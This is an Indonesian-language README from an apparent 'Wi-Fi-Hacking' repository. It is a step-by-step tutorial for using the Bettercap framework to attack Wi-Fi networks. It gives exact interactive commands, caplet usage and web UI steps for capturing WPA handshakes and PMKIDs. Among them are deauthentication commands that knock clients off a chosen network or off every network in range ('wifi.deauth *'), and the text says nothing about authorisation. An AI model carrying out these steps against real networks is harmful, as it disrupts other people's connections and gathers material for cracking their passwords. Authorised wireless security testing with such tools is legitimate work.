# Bettercap

![bettercap logo](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/bettercap%20logo.jpg)

[Bettercap](https://www.bettercap.org/) adalah sebuah framework yang kuat, mudah diperluas, dan portabel yang ditulis dalam [Go](https://id.wikipedia.org/wiki/Go_(bahasa_pemrograman)) yang bertujuan untuk menawarkan kepada peneliti keamanan, red teamer, dan reverse engineer sebuah solusi all-in-one yang mudah digunakan dengan semua fitur yang mungkin mereka perlukan untuk melakukan rekognisi dan menyerang jaringan [Wi-Fi](https://en.wikipedia.org/wiki/Wi-Fi), perangkat [Bluetooth Low Energy](https://en.wikipedia.org/wiki/Bluetooth_Low_Energy), perangkat [HID nirkabel](https://en.wikipedia.org/wiki/USB_human_interface_device_class), [CAN-bus](https://en.wikipedia.org/wiki/CAN_bus), dan jaringan [IPv4](https://en.wikipedia.org/wiki/IPv4)/[IPv6](https://en.wikipedia.org/wiki/IPv6).

## Cara Instal

Kali Linux:

1. Pake packet manager (`apt`):

   ```
   sudo apt-get update
   sudo apt-get install bettercap bettercap-dbgsym bettercap-caplets bettercap-ui
   bettercap -version
   ```

2. Pake Go:

   Pake Go versi: `go1.24.7`
   
   ```
   sudo apt-get update
   sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
   go install github.com/bettercap/bettercap/v2@latest
   sudo mv ~/go/bin/bettercap /usr/local/bin/
   bettercap -version
   ```

Buat info lebih lengkapnya lagi bisa liat di sini: [https://www.bettercap.org/project/installation/](https://www.bettercap.org/project/installation/)

## Cara Pake

Sebelum pake Bettercap, kita harus mengaktifkan mode monitor dulu pake:

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

### 1. Mode Interaktif

Mode interaktif adalah mode pada Bettercap di mana kita pake sesi interaktif dan masukin perintahnya secara manual (interaktif).

Jalanin:

```
sudo bettercap
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

#### Capture Handshake

Single target:

```
set wifi.handshakes.file [output_file]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth [bssid]
```

Semua target:

```
set wifi.handshakes.file [output_dir]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth *
```

#### Capture PMKID

Single target:

```
set wifi.handshakes.file [output_file]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

Semua target:

```
set wifi.handshakes.file [output_dir]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

### 2. Opsi Caplet

Caplet adalah sekumpulan perintah Bettercap yang disimpen di file yang berekstensi `.cap`. Fungsinya itu buat mengotomatisasi eksekusi perintah-perintah yang ada di Bettercap, biar kita kaga usah lagi mengetikkan perintah satu-satu secara manual.

Jalanin:

```
sudo bettercap -caplet [file_caplet]
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

Contoh file capletnya ada di sini: [https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap)

### 3. Mode Web UI

Mode Web UI adalah mode di Bettercap yang menyediakan tampilan web, tujuannya itu biar kita bisa pake Bettercap lewat browser.

Jalanin:

```
sudo bettercap -eval "ui on"
```

1. Arahkan kursor ke link yang ada di bagian `web ui starting on`, yaitu `http://127.0.0.1:80`, terus klik kanan dan pilih `Open Link`.

   ![img 1](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%201.png)
2. Masukkan kredensial login:
   - Usermame: `user`
   - Password: `pass`

   ![img 2](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%202.png)
3. Klik ikon Wi-Fi:

   ![img 3](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%203.png)
4. Pilih interface yang mau dipake dengan klik menu dropdown:


   ![img 4](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%204.png)
5. Mulai scanning Wi-Fi dengan klik ikon play:

   ![img 5](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%205.png)
6. Di gambar ini ada beberapa bagian, yaitu:

   ![img 6](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%206.png)

   - `RSSI`: Kekuatan sinyal dari Access Point (AP) dalam satuan [dBm](https://en.wikipedia.org/wiki/DBm).
   - `ESSID`: Nama Wi-Fi.
   - `BSSID`: Alamat MAC unik dari AP.
   - `Vendor`: Produsen AP berdasarkan BSSID.
   - `Encryption`: Jenis enkripsi yang dipake oleh Wi-Fi.
   - `Ch`: Channel yang dipake oleh AP.
   - `Clients`: Jumlah klien yang terhubung ke AP.
   - `Sent`: Jumlah paket data yang dikirim dari klien ke AP.
   - `Recvd`: Jumlah paket data yang diterima dari AP oleh klien.
   - `Seent`: Jumlah paket yang terdeteksi dari klien atau AP selama proses pemantauan.
8. Di sini, kita harus pilih BSSID target yang mau diserang, terus klik menu dropdownnya:

   ![img 7](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%207.png)
9. Di sini, kita bisa lakuin dua jenis serangan, yaitu:
   - Capture Handshake
   - Capture PMKID
  
   ![img 8](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%208.png)

   Kalo mau Capture Handshake, klik yang `Deauthenticate Client`. Kalo mau Capture PMKID, klik yang `Associate`. Dalam kasus ini, gw bakal pilih `Capture Handshake`.
   
   > Catatan:
   >
   > - Capture Handshake: Harus ada 1 klien yang aktif.
   > - Capture PMKID: Kaga semua router mendukung PMKID.
10. Abis klik `Deauthenticate Client`, tungguin ampe handshakenya berhasil dicapture. Handshake dianggap berhasil dicapture kalo muncul ikon `kunci merah` dibagian `Encryption` dan nongol notifikasi `Captured handshake for station...`:

    ![img 9](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%209.png)
    
11. Klik ikon Events:

    ![img 10](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%2010.png)
12. Klik salah satu dari 3 `Type` yang warna merah di bagian pesannya yang `Captured handshake for...`:

    ![img 11](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%2011.png)
13. Dari gambar ini, keliatan kalo file handshakenya disimpan di direktori: `/root` dan nama filenya adalah: `bettercap-wifi-handshakes.pcap`.

    ![img 12](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%2012.png)
